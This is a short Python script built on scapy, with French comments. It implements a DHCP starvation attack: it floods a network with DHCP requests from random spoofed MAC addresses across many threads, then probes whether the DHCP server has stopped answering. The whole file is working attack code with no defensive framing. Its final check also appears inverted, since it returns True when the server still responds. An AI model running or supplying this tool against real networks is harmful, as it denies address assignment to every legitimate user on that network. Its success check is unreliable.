import randomfrom scapy.all import sendp, srp1, RandMAC, conffrom scapy.layers.l2 import Etherfrom scapy.layers.dhcp import DHCP, IP, BOOTPfrom scapy.layers.inet import UDPfrom concurrent.futures import ThreadPoolExecutorclass DhcpStarvation:    def __init__(self, interface, num_requests, num_threads):        self.interface = interface        self.num_requests = num_requests        self.num_threads = num_threads    # Envoie une demande DHCP avec une adresse MAC source aléatoire    def _send_request(self):        src_mac = RandMAC()        src_ip = "0.0.0.0"        dst_ip = "255.255.255.255"        ethernet = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")        ip = IP(src=src_ip, dst=dst_ip)        udp = UDP(sport=68, dport=67)        bootp = BOOTP(chaddr=src_mac, ciaddr=src_ip, xid=random.randint(1, 1000000), flags=0x8000)        dhcp = DHCP(options=[("message-type", "request"), "end"])        packet = ethernet / ip / udp / bootp / dhcp        sendp(packet, iface=self.interface, verbose=False)    # Exécute l'attaque DHCP Starvation en utilisant plusieurs threads pour envoyer les demandes DHCP    def run_attack(self):        conf.checkIPaddr = False        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:            for _ in range(self.num_requests):                executor.submit(self._send_request)    # Vérifie l'échec du DHCP après l'attaque    def check_dhcp_failure(self, timeout):        src_mac = RandMAC()        src_ip = "0.0.0.0"        dst_ip = "255.255.255.255"        ethernet = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")        ip = IP(src=src_ip, dst=dst_ip)        udp = UDP(sport=68, dport=67)        bootp = BOOTP(chaddr=src_mac, ciaddr=src_ip, xid=random.randint(1, 1000000))        dhcp = DHCP(options=[("message-type", "discover"), "end"])        packet = ethernet / ip / udp / bootp / dhcp        response = srp1(packet, iface=self.interface, timeout=timeout, verbose=False)        #Renvoie True si cela a marché         return response is not None